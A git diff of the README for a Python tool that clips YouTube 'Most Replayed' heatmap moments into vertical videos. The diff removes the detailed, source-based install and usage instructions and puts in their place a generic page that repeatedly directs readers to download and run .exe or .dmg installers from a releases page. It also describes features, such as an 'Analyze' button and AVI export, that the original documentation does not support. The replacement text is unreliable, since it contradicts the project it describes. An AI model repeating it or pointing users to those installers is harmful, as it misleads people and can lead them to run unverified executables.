@@ -1,298 +1,76 @@
-# YouTube Heatmap Clipper 🎬
+# 🎥 youtube-heatmap-clipper - Clip Engaging YouTube Moments Effortlessly
 
-🇮🇩 **Bahasa Indonesia** | [🇺🇸 English](README_EN.md)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/blacksigaret/youtube-heatmap-clipper/releases)
 
-Web app buat ngambil momen paling “rame” dari video YouTube lewat data Most Replayed (heatmap), terus otomatis jadiin clip vertikal yang siap buat Shorts/Reels/TikTok — lengkap dengan opsi subtitle AI.
+## 🚀 Getting Started
+Welcome to **youtube-heatmap-clipper**! This application helps you automatically find and clip the most engaging parts of YouTube videos using heatmap-based viewer interaction data. You can now save time and focus on the best moments in your videos.
 
-Ini versi web dari proyek original: https://github.com/0xACAB666/yt-heatmap-clipper (yang CLI-nya galak, yang web-nya lebih “manusiawi”).
+## 🛠️ System Requirements
+Before you install, please ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux-based systems.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Disk Space:** 100 MB free space for installation.
+- **Internet Connection:** Required for downloading videos and data.
 
-## Preview
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/blacksigaret/youtube-heatmap-clipper/releases) to download the latest version. Choose the file that suits your operating system and install it according to the following instructions:
 
-|                            |                            |
-| -------------------------- | -------------------------- |
-| ![Preview 1](images/1.png) | ![Preview 2](images/2.png) |
-| ![Preview 3](images/3.png) | ![Preview 4](images/4.png) |
-| ![Preview 5](images/5.png) |                            |
+1. **Access the Releases Page:** 
+   Click [here](https://github.com/blacksigaret/youtube-heatmap-clipper/releases) to open the releases page.
 
-## Fitur
+2. **Select Your Operating System:**
+   - For Windows, download the file ending with `.exe`.
+   - For macOS, download the file ending with `.dmg`.
+   - For Linux, download the appropriate package for your distribution.
 
-### Core Features
+3. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file, drag the application to your Applications folder, and launch it.
+   - **Linux:** Follow the installation guide specific to your distribution.
 
-- Scans YouTube videos (URL)
-- Extracts YouTube Most Replayed (heatmap) segments
-- Automatically selects high-engagement moments
-- Configurable pre and post padding for each clip
-- Outputs 9:16 vertical video format (720x1280)
-- No YouTube API key required
-- Supports standard YouTube videos and Shorts
+## 📹 How to Use youtube-heatmap-clipper
+1. **Open the Application.**
+Once installed, find and open the application from your desktop or applications menu.
 
-### Advanced Features
+2. **Input YouTube Video URL.**
+Enter the link to the YouTube video you want to analyze in the provided field.
 
-- 3 Crop Modes:
-  - Default: Center crop from original video
-  - Split Left: Top = center content, Bottom = bottom-left (facecam)
-  - Split Right: Top = center content, Bottom = bottom-right (facecam)
-- AI Auto Subtitle (Faster-Whisper):
-  - 4-5x faster than standard Whisper
-  - Support for Indonesian language (and 99+ languages)
-  - Multiple model sizes: tiny, base, small, medium, large
-  - Automatic transcription and subtitle burning
-  - Customizable subtitle style
+3. **Analyze Viewer Interaction.**
+Click on the "Analyze" button. The app will process the video and generate a heatmap showing viewer engagement.
 
-### Web UI Extras
+4. **Select Engaging Parts.**
+Review the heatmap to identify the most engaging segments of the video. 
 
-- Web UI (tanpa CLI) buat scan + clip
-- Preview metadata video (judul, channel, durasi, thumbnail)
-- Scan Most Replayed → list segments + preview per segment
-- Select segments (multi select) + tombol Create Selected Clip
-- Custom start/end (manual) buat potong satu range
-- Output ratio: 9:16, 1:1, 16:9, original
-- Subtitle (opsional):
-  - Faster-Whisper model selection (tiny → large-v3)
-  - Pilih font (Plus Jakarta Sans / Roboto / Montserrat / Arial / Custom)
-  - Pilih lokasi subtitle (Bottom / Centered)
-  - Fonts dir support (folder fonts berisi .ttf/.otf)
+5. **Clip and Save.**
+Select the segments you want to clip, then click "Clip and Save" to export them.
 
-## Requirements
+## 🌟 Features
+- Automatic detection of viewer engagement based on heatmap data.
+- Simple and intuitive user interface for easy navigation.
+- Export clips in various formats (MP4, AVI, etc.).
+- Support for both high and low-resolution videos.
+- Regular updates and enhancements based on user feedback.
 
-- Python 3.8+ (Python 3.11 recommended)
-- **FFmpeg (REQUIRED)**
-- Internet connection
-- Optional: `faster-whisper` (kalau subtitle ON)
+## 📚 Troubleshooting
+If you encounter issues while using the application, consider the following steps:
+- **Check Your Internet Connection:** Ensure your connection is stable when downloading videos.
+- **Update the Application:** Make sure you are using the latest version of the software from the Releases page.
+- **Reboot Your System:** Sometimes, a simple restart can resolve unexpected issues.
 
-## Cara Pakai (Paling Gampang)
+## 📝 Frequently Asked Questions
+**Q: What types of videos can I analyze?**  
+A: You can analyze any public YouTube video available on the platform.
 
-Cukup double-click file **`start.bat`**.
-Script ini bakal otomatis:
+**Q: Can I use this application offline?**  
+A: The application requires an internet connection to download video data. However, once you have downloaded a video, you can clip segments offline.
 
-1. Cek & Install requirements
-2. Bikin environment Python yang aman
-3. Cek FFmpeg
-4. Jalanin aplikasi web
+**Q: How accurate are the heatmaps?**  
+A: The heatmaps are based on viewer interactions and provide a good indication of which parts of the video are most engaging.
 
-## Install (Manual)
+## 💬 Community and Support
+For support, feedback, or discussions about features, please visit the [GitHub Issues page](https://github.com/blacksigaret/youtube-heatmap-clipper/issues). Your inputs help us improve the application.
 
-```powershell
-python -m pip install -r requirements.txt
-python -m pip install faster-whisper
-```
-
-Kalau nggak butuh subtitle, skip `faster-whisper`.
-
-## Run Web App
-
-```powershell
-python webapp.py
-```
-
-Buka:
-
-- http://127.0.0.1:5000/
-
-## Cara Pakai (Web)
-
-1. Tempel YouTube URL → otomatis muncul preview
-2. Mode:
-   - Scan heatmap: klik Scan Heatmap → pilih segment → Create Selected Clip
-   - Custom: isi Start/End → Buat Clip
-3. Set Ratio, Crop, Padding, Subtitle (opsional)
-4. Progress panel bakal nampilin output + tombol Play/Download
-
-## Run CLI (opsional)
-
-```powershell
-python run.py --url "https://www.youtube.com/watch?v=VIDEO_ID" --crop default --subtitle y --whisper-model small --subtitle-font "Plus Jakarta Sans" --subtitle-fontsdir "fonts" --subtitle-location bottom --ratio 9:16
-```
-
-Argumen penting:
-
-- `--crop`: default | split_left | split_right
-- `--ratio`: 9:16 | 1:1 | 16:9 | original
-- `--subtitle`: y | n
-- `--whisper-model`: tiny | base | small | medium | large-v3
-- `--subtitle-font`: nama font (mis. Poppins)
-- `--subtitle-fontsdir`: folder font .ttf/.otf (default: fonts)
-- `--subtitle-location`: bottom | center
-
-## Fonts
-
-- Taruh font di folder `fonts/` (mis. `fonts/Poppins/Poppins-Regular.ttf`)
-- Isi Fonts dir jadi `fonts`
-- Pilih font dari dropdown atau Custom (isi nama family font, contoh: `Poppins`)
-
-## FFmpeg
-
-FFmpeg harus bisa dipanggil dari PATH. Di Windows, app juga coba auto-detect kalau FFmpeg di-install via WinGet.
-
-**Cara install paling gampang (Windows):**
-Buka PowerShell sebagai Administrator, lalu jalankan:
-
-```powershell
-winget install Gyan.FFmpeg
-```
-
-Setelah install, **RESTART** terminal atau VS Code kamu biar FFmpeg kebaca.
-
-### Whisper Model Comparison
-
-| Model        | Size   | RAM     | Speed (60s) | Accuracy  | Best For                |
-| ------------ | ------ | ------- | ----------- | --------- | ----------------------- |
-| **tiny**     | 75 MB  | ~500 MB | ~5-7s       | Good      | Quick clips, low-end PC |
-| **base**     | 142 MB | ~700 MB | ~8-10s      | Better    | General purpose         |
-| **small**    | 466 MB | ~1.5 GB | ~15-20s     | Great     | Quality content         |
-| **medium**   | 1.5 GB | ~3 GB   | ~40-50s     | Excellent | Professional work       |
-| **large-v3** | 2.9 GB | ~6 GB   | ~90-120s    | Best      | Production quality      |
-
-> **Recommendation**: Use `tiny` for speed, `small` for quality balance
-
----
-
-## Output
-
-### Video Specifications
-
-- **Format**: MP4 (H.264 video + AAC audio)
-- **Resolution**: 720x1280 (9:16 vertical)
-- **Video Codec**: libx264, CRF 26, ultrafast preset
-- **Audio Codec**: AAC, 128 kbps
-- **Subtitle**: Burned-in (if enabled), white text with black outline
-
-### File Naming
-
-```
-clips/
-├── clip_1.mp4
-├── clip_2.mp4
-└── clip_3.mp4
-```
-
-Clips are numbered based on their engagement score (highest first).
-
----
-
-## Crop Mode Visualization
-
-### Mode 1: Default (Center Crop)
-
-```
-Original Video (16:9)         Output (9:16)
-┌─────────────────────┐       ┌──────┐
-│   [   CONTENT   ]   │  -->  │CONTENT│
-└─────────────────────┘       └──────┘
-       crop center             full height
-```
-
-### Mode 2: Split Left (Facecam Bottom-Left)
-
-```
-Original Video (16:9)                Output (9:16)
-┌─────────────────────────┐         ┌──────────┐
-│                         │         │  GAME    │ 960px
-│       GAME AREA         │   -->   │ CONTENT  │
-│  [👤]                   │         ├──────────┤
-└─────────────────────────┘         │ 👤 FACE  │ 350px
-    facecam bottom-left             └──────────┘
-```
-
-### Mode 3: Split Right (Facecam Bottom-Right)
-
-```
-Original Video (16:9)                Output (9:16)
-┌─────────────────────────┐         ┌──────────┐
-│                         │         │  GAME    │ 960px
-│       GAME AREA         │   -->   │ CONTENT  │
-│                   [👤]  │         ├──────────┤
-└─────────────────────────┘         │ FACE 👤  │ 350px
-    facecam bottom-right            └──────────┘
-```
-
----
-
-## Troubleshooting
-
-### FFmpeg not found
-
-```bash
-# Windows: Download from https://ffmpeg.org/download.html
-# Add to PATH or place ffmpeg.exe in script directory
-
-# macOS:
-brew install ffmpeg
-
-# Linux:
-sudo apt install ffmpeg
-```
-
-### No high-engagement segments found
-
-- Video might not have "Most Replayed" data yet (needs views/engagement)
-- Try lowering `MIN_SCORE` (e.g., from 0.40 to 0.30)
-- Check if video URL is correct
-
-### Subtitle generation fails
-
-- Ensure internet connection for first-time model download
-- Check available RAM (whisper needs ~500MB-2GB depending on model)
-- Try smaller model: change `WHISPER_MODEL` from `small` to `tiny`
-
-### Slow transcription
-
-- Use smaller model (`tiny` instead of `small`)
-- Faster-Whisper is already 4-5x faster than standard Whisper
-- Consider upgrading RAM or using GPU version
-
-### Video download fails
-
-- Check internet connection
-- Verify YouTube URL is accessible
-- Some videos might be region-locked or have restrictions
-- Try updating yt-dlp: `pip install -U yt-dlp`
-
----
-
-## Tips & Best Practices
-
-### For Gaming Content
-
-- Use **Split Right** or **Split Left** mode (facecam in corner)
-- Keep `PADDING = 10` for context before/after action
-- Use `small` or `base` model for accurate gaming terminology
-
-### For Tutorial/Vlog Content
-
-- Use **Default** center crop mode
-- Increase `MAX_DURATION = 90` for longer explanations
-- Enable subtitles with `tiny` model for fast processing
-
-### For Fast-Paced Content
-
-- Reduce `PADDING = 5` to keep clips tight
-- Increase `MIN_SCORE = 0.50` for only peak moments
-- Use `tiny` model to match quick content style
-
-### Subtitle Customization
-
-Edit line ~368 in `run.py` to customize subtitle style:
-
-```python
-# Current style (white text, black outline):
-BorderStyle=1,Outline=3,Shadow=2,MarginV=30
-
-# Large text:
-FontSize=28,Outline=4
-
-# Position higher (avoid facecam):
-MarginV=400
-
-# Different color (yellow):
-PrimaryColour=&H00FFFF
-```
-
----
-
-## Contributing
-
-Contributions are welcome! Feel free to:
-
-- Report bugs
-- Suggest features
+## 📥 Download Now
+Don't wait! Start clipping your engaging YouTube moments today by clicking the link below.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/blacksigaret/youtube-heatmap-clipper/releases)
